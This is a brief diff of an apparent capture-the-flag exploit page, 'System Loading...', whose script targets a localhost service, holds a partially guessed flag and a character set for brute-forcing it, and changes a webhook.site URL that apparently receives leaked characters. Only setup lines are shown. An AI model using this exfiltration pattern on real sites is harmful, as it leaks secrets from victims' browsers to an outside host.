@@ -7,7 +7,7 @@
     <h1>System Loading...</h1>
     <script>
         const TARGET = 'http://localhost:3031'; 
-        const REPORT_URL = 'https://webhook.site/c52095bc-72e6-4717-80a3-37bddf872811'; 
+        const REPORT_URL = 'https://webhook.site/c4734990-7292-43a9-97fc-54ef27ff7a64'; 
         let flag = "RS{a"; 
         const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
 
